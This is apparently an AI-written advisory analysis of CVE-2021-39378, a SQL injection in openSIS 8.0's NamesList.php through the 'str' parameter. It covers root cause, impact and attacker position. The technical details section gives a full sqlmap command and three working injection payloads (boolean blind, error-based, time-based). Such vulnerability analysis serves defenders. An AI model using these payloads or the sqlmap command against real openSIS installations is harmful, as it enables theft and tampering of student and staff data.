Based on the provided information, here's an analysis of CVE-2021-39378:

**Root Cause of Vulnerability:**
- The vulnerability is due to a SQL injection flaw in the `NamesList.php` file within openSIS version 8.0.
- The application is vulnerable when using MySQL (or MariaDB).
- The `str` parameter is not properly sanitized, allowing malicious SQL commands to be injected.

**Weaknesses/Vulnerabilities Present:**
- SQL Injection: The application fails to properly sanitize user-supplied input, allowing an attacker to inject arbitrary SQL code.
- Lack of input validation: The `str` parameter is directly used in SQL queries without proper sanitization or validation.

**Impact of Exploitation:**
- An attacker can execute arbitrary SQL queries against the database.
- This can lead to:
    - Data Breach: Access to sensitive information (student data, staff data, etc.).
    - Data Modification: Manipulation or deletion of data in the database.
    - Complete compromise of the database server.

**Attack Vectors:**
- The attack vector is through the HTTP GET parameter `str` in the `NamesList.php` page.

**Required Attacker Capabilities/Position:**
- The attacker must be able to send HTTP requests to the openSIS application.
- The attacker does not need to be authenticated.

**Technical Details:**
- Vulnerable PHP Page: `NamesList.php`
- Vulnerable Parameter: `str`
- Example Attack using sqlmap:
    ```
    sqlmap -u "<http://localhost:8081/NamesList.php?str=J&block_id=1>" --cookie="PHPSESSID=s8n71sv8ji77mdjkmh6cj1ik5d; miniSidebar=0" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" --referer="<http://localhost:8081/Modules.php?modname=miscellaneous/Portal.php&failed_login=0>" --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --level=3 --risk=3 --threads=8 --time-sec=5 -b --current-db --batch --answers="crack=N,dict=N,continue=Y,quit=N"
    ```
- Example SQL injection payloads used:
    - Boolean-based blind: `str=J%' AND 4830=4830 AND 'mmPI%'='mmPI&block_id=1`
    - Error-based: `str=J%' AND (SELECT 5261 FROM(SELECT COUNT(*),CONCAT(0x716b6b7a71,(SELECT (ELT(5261=5261,1))),0x7176706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'YfUK%'='YfUK&block_id=1`
    - Time-based blind: `str=J%' AND (SELECT 9071 FROM (SELECT(SLEEP(5)))hYUR) AND 'vbOt%'='vbOt&block_id=1`
